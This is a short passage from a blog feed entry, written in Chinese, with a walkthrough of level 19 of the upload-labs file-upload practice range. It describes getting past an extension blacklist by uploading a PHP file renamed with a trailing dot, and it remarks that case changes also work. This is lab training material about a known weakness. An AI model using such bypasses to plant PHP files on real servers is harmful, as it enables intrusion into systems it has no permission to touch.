&lt;h2 id=&#34;过程-19&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-19&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;可以自定义名称&lt;/p&gt;
&lt;p&gt;上传 a.php&lt;/p&gt;
&lt;p&gt;自定义名称 haha.php.&lt;/p&gt;
&lt;p&gt;因为用的黑名单，上传成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-19-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;大小写都能绕哈哈哈&lt;/p&gt;
&lt;h2 id=&#34;总结-19&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-19&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;哈哈哈&lt;/p&gt;
</content>
        <category term="文件上传靶场" />
        <updated>2020-11-25T13:24:52.000Z</updated>
    </entry>
</feed>
